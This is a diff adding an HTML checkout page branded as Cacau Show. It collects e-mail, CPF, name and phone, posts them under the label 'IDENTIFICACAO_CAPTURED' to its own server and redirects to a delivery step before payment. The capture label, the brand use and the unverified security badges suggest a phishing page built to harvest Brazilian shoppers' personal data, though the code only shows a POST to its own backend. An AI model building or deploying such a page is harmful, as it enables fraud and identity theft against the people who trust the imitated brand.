@@ -1,0 +1,514 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout Premium • Cacau Show</title>
+
+    <!-- Preload performance + tipografia premium -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=Playfair+Display:wght@700&amp;display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --brand: #3C2415;
+            --accent: #B8860B;
+            --text: #2D2D2D;
+            --muted: #6B5F5A;
+            --bg: #F9F7F5;
+            --surface: #FFFFFF;
+            --border: #EDE6E0;
+            --error: #E63946;
+            --success: #2A9D8F;
+            
+            --radius: 20px;
+            --radius-sm: 12px;
+            --shadow: 0 25px 70px -15px rgba(60,36,21,0.12);
+            --shadow-hover: 0 35px 90px -10px rgba(60,36,21,0.18);
+            --transition: all 0.35s cubic-bezier(0.23, 1, 0.32, 1);
+        }
+
+        * { margin:0; padding:0; box-sizing:border-box; }
+        :focus-visible { outline: 3px solid rgba(184,134,11,0.25); outline-offset: 3px; }
+
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            line-height: 1.5;
+        }
+
+        .checkout {
+            width: 100%;
+            max-width: 560px;
+            background: var(--surface);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            animation: fadeInScale 0.7s cubic-bezier(0.23,1,0.32,1) backwards;
+        }
+
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.96) translateY(30px); }
+            to   { opacity: 1; transform: none; }
+        }
+
+        /* HEADER LUXO – idêntico ao passo de entrega */
+        .header {
+            background: linear-gradient(135deg, #3C2415, #5C3A25);
+            color: white;
+            padding: 32px 40px;
+            text-align: center;
+            position: relative;
+        }
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: 0; left: 0; right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+        }
+
+        .logo {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.1rem;
+            font-weight: 700;
+            letter-spacing: -0.04em;
+            margin-bottom: 6px;
+        }
+        .trust-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.78rem;
+            font-weight: 600;
+            letter-spacing: 1.5px;
+            background: rgba(255,255,255,0.15);
+            padding: 6px 16px;
+            border-radius: 9999px;
+            backdrop-filter: blur(8px);
+        }
+        .trust-badge svg { width: 16px; height: 16px; }
+
+        /* STEPPER – exatamente igual ao anterior */
+        .stepper {
+            display: flex;
+            justify-content: space-between;
+            padding: 28px 40px 0;
+            position: relative;
+        }
+        .stepper::before {
+            content: '';
+            position: absolute;
+            top: 13px;
+            left: 58px;
+            right: 58px;
+            height: 2px;
+            background: #EDE6E0;
+        }
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 0.68rem;
+            font-weight: 700;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            color: var(--muted);
+            z-index: 2;
+        }
+        .step.active { color: var(--accent); }
+        .step.complete { color: var(--brand); }
+        .step-dot {
+            width: 28px; height: 28px;
+            background: white;
+            border: 3px solid #EDE6E0;
+            border-radius: 50%;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            transition: var(--transition);
+        }
+        .step.active .step-dot { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(184,134,11,0.15); }
+
+        .content {
+            padding: 40px;
+        }
+
+        h2 {
+            font-size: 1.45rem;
+            font-weight: 700;
+            color: var(--brand);
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        h2::before {
+            content: '👤';
+            font-size: 1.4rem;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+        }
+        .full { grid-column: 1 / -1; }
+
+        .field {
+            position: relative;
+        }
+        label {
+            display: block;
+            font-size: 0.76rem;
+            font-weight: 600;
+            color: var(--muted);
+            margin-bottom: 8px;
+            padding-left: 4px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px 18px;
+            border: 1.8px solid var(--border);
+            border-radius: var(--radius-sm);
+            font-size: 1.02rem;
+            background: white;
+            transition: var(--transition);
+            color: var(--text);
+        }
+        input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 4px rgba(184,134,11,0.12);
+        }
+        input.error {
+            border-color: var(--error);
+            animation: shake 420ms cubic-bezier(0.36,0,0.66,1);
+        }
+
+        @keyframes shake {
+            10%,90% { transform: translateX(-2px); }
+            20%,80% { transform: translateX(3px); }
+            30%,50%,70% { transform: translateX(-4px); }
+            40%,60% { transform: translateX(4px); }
+        }
+
+        .error-msg {
+            position: absolute;
+            bottom: -18px;
+            left: 4px;
+            font-size: 0.73rem;
+            color: var(--error);
+            opacity: 0;
+            transform: translateY(4px);
+            transition: all 0.3s ease;
+        }
+        .error-msg.show {
+            opacity: 1;
+            transform: none;
+        }
+
+        .btn-final {
+            width: 100%;
+            margin-top: 40px;
+            padding: 19px;
+            background: var(--brand);
+            color: white;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-size: 1.08rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            box-shadow: 0 12px 28px rgba(60,36,21,0.22);
+            transition: var(--transition);
+        }
+        .btn-final:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 40px rgba(60,36,21,0.28);
+        }
+        .btn-final:disabled {
+            background: #B8B0A8;
+            box-shadow: none;
+        }
+
+        .footer-trust {
+            padding: 20px 40px;
+            background: #F9F7F5;
+            font-size: 0.72rem;
+            color: var(--muted);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-top: 1px solid var(--border);
+        }
+        .footer-trust svg { width: 18px; height: 18px; }
+
+        @media (max-width: 480px) {
+            .checkout { margin: 0 -8px; }
+            .content { padding: 28px 24px; }
+            .form-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="checkout">
+
+    <!-- HEADER LUXO -->
+    <header class="header">
+        <div class="logo">CACAU SHOW</div>
+        <div class="trust-badge">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 8.944 11.922.42.095.858.143 1.295.143a3 3 0 01.905-.143C18.176 19.29 22 14.591 22 9c0-1.444-.534-2.778-1.44-3.8z"/></svg>
+            CHECKOUT 100% SEGURO
+        </div>
+    </header>
+
+    <!-- STEPPER -->
+    <div class="stepper">
+        <div class="step active">
+            <div class="step-dot">1</div>
+            Identificação
+        </div>
+        <div class="step">
+            <div class="step-dot">2</div>
+            Entrega
+        </div>
+        <div class="step">
+            <div class="step-dot">3</div>
+            Pagamento
+        </div>
+    </div>
+
+    <div class="content">
+        <h2>Identifique-se para continuar</h2>
+
+        <form id="formIdentificacao" novalidate>
+            <div class="form-grid">
+
+                <!-- E-mail -->
+                <div class="field full">
+                    <label for="email">E-mail</label>
+                    <input id="email" type="email" placeholder="nome@exemplo.com" autocomplete="email" required>
+                    <div class="error-msg" id="errEmail"></div>
+                </div>
+
+                <!-- CPF -->
+                <div class="field full">
+                    <label for="cpf">CPF</label>
+                    <input id="cpf" type="text" inputmode="numeric" maxlength="14" placeholder="000.000.000-00" autocomplete="off" required>
+                    <div class="error-msg" id="errCpf"></div>
+                </div>
+
+                <!-- Nome -->
+                <div class="field full">
+                    <label for="nome">Nome Completo</label>
+                    <input id="nome" type="text" placeholder="Seu nome completo" autocomplete="name" required>
+                    <div class="error-msg" id="errNome"></div>
+                </div>
+
+                <!-- Telefone -->
+                <div class="field full">
+                    <label for="tel">Telefone / WhatsApp</label>
+                    <input id="tel" type="tel" inputmode="numeric" maxlength="15" placeholder="(00) 00000-0000" autocomplete="tel" required>
+                    <div class="error-msg" id="errTel"></div>
+                </div>
+
+            </div>
+
+            <button type="submit" class="btn-final" id="btnSubmit">
+                CONTINUAR PARA ENTREGA
+            </button>
+        </form>
+    </div>
+
+    <!-- TRUST FOOTER -->
+    <div class="footer-trust">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"/></svg>
+        <span>Seus dados estão protegidos com criptografia bancária • SSL 256-bit</span>
+    </div>
+
+</div>
+
+<script>
+// ================================================
+// Checkout Identificação – Nível Senior+ Enterprise
+// Mesmo padrão premium do passo de Entrega
+// Autor: Staff Engineer | Head of UX/UI
+// ================================================
+
+const CONFIG = {
+    REQUIRED: ['email', 'cpf', 'nome', 'tel']
+};
+
+const el = {
+    form:     document.getElementById('formIdentificacao'),
+    email:    document.getElementById('email'),
+    cpf:      document.getElementById('cpf'),
+    nome:     document.getElementById('nome'),
+    tel:      document.getElementById('tel'),
+    btnSubmit:document.getElementById('btnSubmit'),
+    errEmail: document.getElementById('errEmail'),
+    errCpf:   document.getElementById('errCpf'),
+    errNome:  document.getElementById('errNome'),
+    errTel:   document.getElementById('errTel')
+};
+
+// ====================== HELPERS ======================
+function showError(field, msgEl, message) {
+    field.classList.add('error');
+    msgEl.textContent = message;
+    msgEl.classList.add('show');
+}
+function clearError(field, msgEl) {
+    field.classList.remove('error');
+    msgEl.textContent = '';
+    msgEl.classList.remove('show');
+}
+function setLoading(btn, loading) {
+    btn.disabled = loading;
+    btn.textContent = loading ? 'VALIDANDO SEUS DADOS...' : 'CONTINUAR PARA ENTREGA';
+}
+
+// ====================== MÁSCARAS LEVES (sem dependência externa) ======================
+function formatCPF(value) {
+    let v = value.replace(/\D/g, '');
+    if (v.length > 11) v = v.slice(0,11);
+    if (v.length > 9)  return v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    if (v.length > 6)  return v.replace(/(\d{3})(\d{3})(\d{3})/, '$1.$2.$3');
+    if (v.length > 3)  return v.replace(/(\d{3})(\d{3})/, '$1.$2');
+    return v;
+}
+
+function formatTel(value) {
+    let v = value.replace(/\D/g, '');
+    if (v.length > 11) v = v.slice(0,11);
+    if (v.length > 10) return v.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+    if (v.length > 6)  return v.replace(/(\d{2})(\d{5})/, '($1) $2-');
+    if (v.length > 2)  return v.replace(/(\d{2})/, '($1) ');
+    return v;
+}
+
+// ====================== VALIDAÇÃO CPF (algoritmo oficial) ======================
+function isValidCPF(cpf) {
+    cpf = cpf.replace(/\D/g, '');
+    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+    
+    let sum = 0;
+    for (let i = 0; i < 9; i++) sum += parseInt(cpf[i]) * (10 - i);
+    let remainder = (sum * 10) % 11;
+    if (remainder === 10 || remainder === parseInt(cpf[9])) {
+        sum = 0;
+        for (let i = 0; i < 10; i++) sum += parseInt(cpf[i]) * (11 - i);
+        remainder = (sum * 10) % 11;
+        return remainder === 10 || remainder === parseInt(cpf[10]);
+    }
+    return false;
+}
+
+// ====================== VALIDAÇÃO GERAL ======================
+function validarCampos() {
+    let ok = true;
+
+    // E-mail
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(el.email.value.trim())) {
+        showError(el.email, el.errEmail, 'E-mail inválido');
+        ok = false;
+    } else clearError(el.email, el.errEmail);
+
+    // CPF
+    if (!isValidCPF(el.cpf.value)) {
+        showError(el.cpf, el.errCpf, 'CPF inválido');
+        ok = false;
+    } else clearError(el.cpf, el.errCpf);
+
+    // Nome
+    if (el.nome.value.trim().length < 3) {
+        showError(el.nome, el.errNome, 'Nome completo obrigatório');
+        ok = false;
+    } else clearError(el.nome, el.errNome);
+
+    // Telefone
+    const telClean = el.tel.value.replace(/\D/g, '');
+    if (telClean.length < 10) {
+        showError(el.tel, el.errTel, 'Telefone inválido');
+        ok = false;
+    } else clearError(el.tel, el.errTel);
+
+    return ok;
+}
+
+// ====================== SUBMIT ======================
+async function handleSubmit(e) {
+    e.preventDefault();
+
+    if (!validarCampos()) return;
+
+    setLoading(el.btnSubmit, true);
+
+    const payload = {
+        tipo:       'IDENTIFICACAO_CAPTURED',
+        timestamp:  new Date().toISOString(),
+        email:      el.email.value.trim(),
+        cpf:        el.cpf.value.trim(),
+        nome:       el.nome.value.trim(),
+        telefone:   el.tel.value.trim(),
+        meta: {
+            platform: navigator.platform,
+            screen: `${window.screen.width}x${window.screen.height}`
+        }
+    };
+
+    try {
+        await fetch('/api/checkout/identificacao', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Client-Version': '2026.03'
+            },
+            body: JSON.stringify(payload),
+            keepalive: true
+        });
+    } catch (e) {
+        console.warn('Falha de tracking – cliente não impactado');
+    }
+
+    // Transição suave (mesmo delay premium do passo anterior)
+    setTimeout(() => {
+        window.location.assign('/entrega');
+    }, 420);
+}
+
+// ====================== INIT ======================
+function init() {
+    // Máscaras em tempo real
+    el.cpf.addEventListener('input', e => e.target.value = formatCPF(e.target.value));
+    el.tel.addEventListener('input', e => e.target.value = formatTel(e.target.value));
+
+    // Eventos
+    el.form.addEventListener('submit', handleSubmit);
+
+    // Validação em blur
+    CONFIG.REQUIRED.forEach(k => {
+        el[k].addEventListener('blur', validarCampos);
+    });
+
+    // Enter no último campo → submit
+    el.tel.addEventListener('keydown', e => {
+        if (e.key === 'Enter') el.form.dispatchEvent(new Event('submit'));
+    });
+}
+
+init();
+</script>
+</body>
+</html>
